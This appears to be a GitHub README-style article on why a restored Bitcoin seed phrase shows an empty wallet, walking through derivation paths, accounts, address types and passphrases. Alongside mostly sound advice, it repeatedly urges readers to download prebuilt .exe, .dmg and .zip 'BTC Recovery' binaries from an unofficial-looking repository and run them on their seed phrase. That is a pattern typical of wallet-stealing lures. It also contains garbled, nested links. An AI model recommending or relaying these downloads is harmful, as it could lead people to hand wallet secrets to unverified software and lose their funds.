<div align="center">
<img src="assets/banner-article.png" alt="Restored seed shows an empty wallet: derivation paths">
</div>

# Restored seed shows an empty wallet: derivation paths

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A correct phrase that restores an empty wallet is almost never a lost wallet. The words are right and the keys exist, but the wallet read them through a different path than the one that made your addresses  -  different application, different account, different address type, or a passphrase you have forgotten you set.

## You'll see this if

The restore completes, the app is happy, and the balance is zero or the address is unfamiliar. Nothing is broken; the phrase simply produced a different branch of the same tree.

| What you see | Most likely cause | Where it goes |
|---|---|---|
| Phrase accepted, zero balance, unfamiliar address | wrong wallet application or derivation option | here |
| Phrase accepted, one address looks familiar, others do not | wrong account or address type | here |
| Phrase accepted, wallet shows a balance smaller than expected | funds split across accounts or addresses | here |
| Phrase accepted, but the wallet asks for a passphrase | a BIP39 passphrase exists | [BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md) |
| Phrase rejected outright | not this problem  -  the words or order are wrong | [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) |
| Balance visible but unspendable | an unsupported script type, not a recovery problem | the wallet's own support route |

## Why it happens

A phrase does not point at one address. It seeds a derivation function, and that function takes options: which curve standard, which account index, which address format, and whether a passphrase is mixed in. Each combination produces a valid wallet, and only one of them produces the wallet you actually used.

Different applications choose different defaults, which is why restoring the same phrase in two wallets can show two different balances. Hardware devices often expose several of these branches as named accounts. Mobile wallets sometimes pick a branch that desktop software does not, and an address format change over the years  -  legacy to nested to native SegWit  -  adds another axis.

The reassuring part is the arithmetic: if the phrase is correct, every one of those branches exists and can be reproduced deliberately. The work is not recovery but enumeration  -  checking the small number of combinations your wallet could plausibly have used, with an address from your records as the test.

## Fix

Work through the four axes in order  -  application, account, address type, passphrase  -  and compare the first receive address at each step. That comparison, not the balance display, is what tells you when you have arrived.

1. **Write down the address you expect to see.** From an old screenshot, a statement, a payment record. Without a target, "empty" and "wrong branch" look identical.
2. **Restore into a wallet that offers derivation options.** Many applications expose an account or address-type selector during restore; the default is often not the one your wallet used.
3. **Try the other application family.** If the phrase came from a desktop wallet, restore it in that family before concluding anything: [You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md).
4. **Step through account indexes.** Account 0 is the default; funds sometimes sit on account 1 or higher, especially where a second account was created years later.
5. **Try the address types deliberately**  -  legacy, nested SegWit, native SegWit  -  and compare the first address each produces against your record.
6. **Test for a passphrase.** If a passphrase exists, the same words produce a different wallet with it and without it: [BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md).
7. **Use the tool when the wallet will not enumerate.** Download the current release from the GitHub releases page and let it derive candidates across paths against your known address: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).

One habit makes this fast: change one axis at a time and write down the address each combination produces. Four axes tested in combination is a maze; tested one at a time it is a short list.

## If that did not work

If every plausible branch has been tried and no address matches, the phrase is not the phrase that made the wallet  -  which is a different problem, with a different route.

Go back to the words themselves before adding more branches. A single word that is valid but wrong produces a perfectly good wallet that is not yours, and the only symptom is an address that never matches: [How to recover a Bitcoin wallet with a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/recover-bitcoin-wallet-with-seed-phrase-btcrecover.md). If the phrase came from a wallet you cannot identify at all, the identification step is worth more than another derivation guess. Where the wallet is gone and no address was ever recorded, the practical test becomes a transaction in your history rather than an address  -  a received payment shows the destination even when the app does not.

There is a floor to this. If the phrase is complete, valid and confirmed by an address, and the balance is genuinely zero on every branch, the coins are not in that wallet; recovering an empty wallet is not a recovery problem. [A run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md)) sets out the checks in the order that eliminates the most possibilities per minute.

## Prevention

- Record the first receive address, the wallet name and any passphrase flag with every backup.
- Note which account you used if the wallet had more than one.
- Restore the backup once a year into a spare wallet and compare addresses.
- Keep the phrase and its context together; the words alone lose the branch information.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### Why does my seed phrase show an empty wallet?

Because the phrase was read through a different derivation path than the wallet that made your addresses. The keys and coins are unchanged; the application, account, address type or passphrase differs from the original.

### Can seed phrases be used to regenerate entire wallets?

Yes  -  that is exactly what they do, including every account and address the wallet ever showed. What they do not carry is which of those branches you were using, which is why the restore has to be pointed at the right one.

### What is a 12-word secret recovery phrase?

The same thing as any other recovery phrase: twelve words that regenerate a wallet. The label varies between applications, and the word count varies between formats, but the mechanism  -  words in, keys out  -  does not.

### How do I find the right derivation path?

Start from the wallet application that made the phrase, then test account and address type one at a time, comparing the first receive address at each step. The path is confirmed by the address, never by the balance display.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [How to recover a Bitcoin wallet with a seed phrase]([How to recover a Bitcoin wallet with a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/recover-bitcoin-wallet-with-seed-phrase-btcrecover.md))
- [BIP39 passphrase and the 25th word]([BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md))
- [You forgot which wallet software you used]([You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md))
- [How to find a lost Bitcoin wallet address]([How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md))
